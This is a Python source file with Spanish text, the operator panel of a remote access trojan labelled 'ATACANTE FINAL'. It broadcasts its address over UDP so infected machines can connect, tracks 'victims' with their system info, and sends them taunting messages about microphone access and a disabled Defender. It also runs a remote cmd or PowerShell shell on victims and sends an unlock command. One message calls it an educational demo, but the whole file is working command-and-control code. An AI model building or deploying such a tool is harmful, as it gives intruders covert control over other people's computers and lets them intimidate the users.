# -*- coding: utf-8 -*-
"""
ATACANTE FINAL - Auto-discovery + Shell remoto + Control total
"""
import socket, threading, sys, time, os, subprocess, json
from datetime import datetime

PUERTO_TCP = 5555
PUERTO_UDP = 5556
victimas = {}
lock = threading.Lock()
next_id = 1

MSG_PRESET = [
    "Hola... te arrepentis de haber ejecutado ese archivo?",
    "Mira lo que hiciste. Ahora estoy dentro.",
    "Windows Defender? Desactivado.",
    "Firewall? No te sirve de nada.",
    "Tu microfono lo tengo yo ahora.",
    "Esto es lo que pasa por ejecutar archivos desconocidos.",
    "No confies en todo lo que te llega.",
    "DEMO EDUCATIVA - Aprendiste algo?",
]

def obtener_ip_local():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80)); ip = s.getsockname()[0]; s.close(); return ip
    except: return "127.0.0.1"

def broadcast_atacante():
    ip = obtener_ip_local()
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        while True:
            try:
                msg = f"ATACANTE_AQUI:{ip}:{PUERTO_TCP}"
                for bcast in ["255.255.255.255", "192.168.163.255", "192.168.1.255", "10.0.2.255"]:
                    sock.sendto(msg.encode(), (bcast, PUERTO_UDP))
            except: pass
            time.sleep(2)
    except: pass

def limpiar():
    os.system('cls' if os.name == 'nt' else 'clear')

def banner():
    limpiar()
    ip = obtener_ip_local()
    print(f"\033[91m{'='*60}")
    print(f"  ATACANTE - PANEL DE CONTROL REMOTO")
    print(f"  IP: {ip}:{PUERTO_TCP}")
    print(f"  {datetime.now().strftime('%H:%M:%S')}")
    print(f"{'='*60}\033[0m")

def manejar_victima(conn, addr, vid):
    ip = addr[0]; nombre = f"Victima-{vid}"
    with lock:
        victimas[vid] = {'conn': conn, 'addr': addr, 'ip': ip, 'nombre': nombre}
    try:
        conn.settimeout(5)
        try:
            data = conn.recv(4096)
            if data:
                for linea in data.decode("utf-8").split("\n"):
                    linea = linea.strip()
                    if linea.startswith("[IP]"):
                        with lock: victimas[vid]['ip'] = linea[4:]
                    elif linea.startswith("[PCINFO]"):
                        with lock: victimas[vid]['pcinfo'] = linea[8:]
        except: pass
        print(f"\033[92m[+] {nombre} conectada - {victimas[vid].get('ip', ip)}\033[0m")
        if 'pcinfo' in victimas[vid]:
            print(f"\033[93m    {victimas[vid]['pcinfo']}\033[0m")

        conn.settimeout(None)
        while True:
            try:
                data = conn.recv(8192)
                if not data: break
                msg = data.decode("utf-8", errors="replace")
                if msg.startswith("[PCINFO]"):
                    with lock: victimas[vid]['pcinfo'] = msg[8:]
                    print(f"\033[93m[INFO] {nombre}: {msg[8:]}\033[0m")
                elif msg.startswith("[CMDOUT]"):
                    output = msg[8:]
                    print(f"\033[94m[CMDOUT {nombre}]\033[0m\n{output}")
                elif msg.startswith("[CMDERR]"):
                    print(f"\033[91m[CMDERR {nombre}] {msg[8:]}\033[0m")
            except: break
    except: pass
    finally:
        with lock:
            if vid in victimas: del victimas[vid]
        try: conn.close()
        except: pass
        print(f"\033[91m[-] {nombre} desconectada\033[0m")

def listar():
    with lock:
        if not victimas:
            print("\033[93m[!] No hay victimas\033[0m"); return None
        print("\n\033[96m=== VICTIMAS ===\033[0m")
        for vid, info in victimas.items():
            print(f"  [\033[92m{vid}\033[0m] {info['nombre']} - {info.get('ip','?')}")
            if info.get('pcinfo'): print(f"       {info['pcinfo']}")
        return list(victimas.keys())

def enviar(vid, msg):
    with lock:
        if vid not in victimas: return False
        conn = victimas[vid]['conn']
    try:
        conn.send(msg.encode("utf-8"))
        return True
    except: return False

def shell_remoto(vid):
    """Shell remoto - ejecuta comandos en la victima"""
    print(f"\n\033[96m=== SHELL REMOTO - Victima-{vid} ===\033[0m")
    print("  Escribe comandos (cmd o powershell)")
    print("  /exit - volver al menu")
    print("  /ps   - cambiar a PowerShell")
    print("  /cmd  - cambiar a CMD")
    print("\033[90m  Ej:  ipconfig   |   whoami   |   dir   |   systeminfo\033[0m")
    shell = "cmd"
    while True:
        cmd = input(f"\033[95m{shell}@{vid}>> \033[0m").strip()
        if cmd.lower() == "/exit": break
        elif cmd == "/ps": shell = "powershell"; print("[*] Usando PowerShell"); continue
        elif cmd == "/cmd": shell = "cmd"; print("[*] Usando CMD"); continue
        elif not cmd: continue
        elif cmd.lower() == "cls" or cmd.lower() == "clear":
            limpiar(); continue
        payload = f"[CMD]{shell}|{cmd}"
        if enviar(vid, payload):
            print(f"\033[90m[Ejecutando en Victima-{vid}] Esperando salida...\033[0m")
        else:
            print("\033[91m[!] Error enviando comando\033[0m"); break

def menu_victima(vid):
    while True:
        print(f"\n\033[96m>> Victima-{vid} <<\033[0m")
        print("  [1] Enviar mensaje")
        print("  [2] Shell remoto (ejecutar comandos)")
        print("  [3] Desbloquear (UNLOCK)")
        print("  [4] Enviar mensaje personalizado")
        print("  [B] Volver")
        cmd = input("\033[95m>> \033[0m").strip()
        if cmd.lower() == "b": break
        elif cmd == "2": shell_remoto(vid)
        elif cmd == "3": enviar(vid, "[UNLOCK]"); break
        elif cmd == "4":
            msg = input("Mensaje: ").strip()
            if msg: enviar(vid, msg)
        elif cmd == "1":
            print("\nMensajes:")
            for i, m in enumerate(MSG_PRESET, 1): print(f"  [{i}] {m}")
            try:
                idx = int(input("Numero: ").strip())-1
                if 0 <= idx < len(MSG_PRESET): enviar(vid, MSG_PRESET[idx])
            except: print("[!] Numero invalido")

def menu_principal():
    while True:
        print("\n\033[96m=== MENU ===\033[0m")
        print("  [L] Listar victimas")
        print("  [S] Seleccionar victima")
        print("  [Q] Salir")
        cmd = input("\033[95m>> \033[0m").strip().lower()
        if cmd == "q": break
        elif cmd == "l": listar()
        elif cmd == "s":
            ids = listar()
            if ids:
                try:
                    v = int(input("ID: "))
                    if v in victimas: menu_victima(v)
                    else: print("[!] ID invalido")
                except: print("[!] Numero invalido")

def main():
    limpiar()
    banner()
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        server.bind(("0.0.0.0", PUERTO_TCP))
        server.listen(10)
    except Exception as e:
        print(f"\033[91m[!] {e}\n    Ejecuta como admin\033[0m")
        sys.exit(1)
    threading.Thread(target=broadcast_atacante, daemon=True).start()
    def aceptar():
        while True:
            try:
                conn, addr = server.accept()
                global next_id; vid = next_id; next_id += 1
                threading.Thread(target=manejar_victima, args=(conn, addr, vid), daemon=True).start()
            except: break
    threading.Thread(target=aceptar, daemon=True).start()
    try: menu_principal()
    except KeyboardInterrupt: print("\n[*] Cerrando")
    finally: server.close()

if __name__ == "__main__":
    main()
